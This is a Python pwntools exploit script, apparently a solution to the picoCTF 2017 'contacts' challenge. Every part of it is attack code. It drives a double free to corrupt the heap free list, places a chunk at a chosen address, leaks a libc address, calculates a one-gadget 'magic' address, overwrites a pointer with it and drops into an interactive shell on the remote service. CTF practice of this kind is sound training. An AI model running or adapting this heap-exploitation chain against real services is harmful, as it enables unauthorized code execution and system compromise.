from pwn import *

#r = process('./contacts')
r = remote('shell2017.picoctf.com', 18494)
def run_cmd(cmd, line=True):
    r.recvuntil('$ ')
    r.sendline(cmd)
    if line:
        return r.recvline()

run_cmd('add 0 e1 111-111-1111') # success
run_cmd('add 1 e2 222-222-2222') # success
for i in range(20,20 + 62): # free size should be 65
#for i in range(20,20 + 62): # free size should be 65
    run_cmd('add {} fake 999-999-9999'.format(i))

run_cmd('add 0 e3 3') # fail, free 0 -> free list = [x, 0]
run_cmd('add 1 e3 3') # fail, free 1 -> free list = [x, 1, x, 0]
run_cmd('add 0 e3 3') # fail, free 0 -> free list = [x, 0, x, 1, x, 0]
run_cmd('add 200 fake 999-999-9999')
run_cmd('add 2 e3 333-333-3333') # success, free list = [1, 0]
run_cmd('add 3 e4 444-444-4444') # success, free list = [0]
print run_cmd('update-id e3 {}'.format(0x602f38 - 8))
run_cmd('add 4 e5 555-555-5555') # putting on free list
run_cmd('add 5 aaaaaaaaaaaaaaaaaaaaaaaa 666-666-6666') # should be at 0x602f38
s = run_cmd('get 5')
print s
res = s[27:].split(' ')[0]
print res
system_addr = unpack(res, 'all') - 3558928
#magic_addr = system_addr + 612389 + 450
magic_addr = system_addr - 284
print('Magic: {}'.format(hex(magic_addr)))
print 'Setting to {}'.format(s[3:].split(' ')[0])

print run_cmd('update-id {} {}'.format(s[3:].split(' ')[0],magic_addr))
r.interactive()
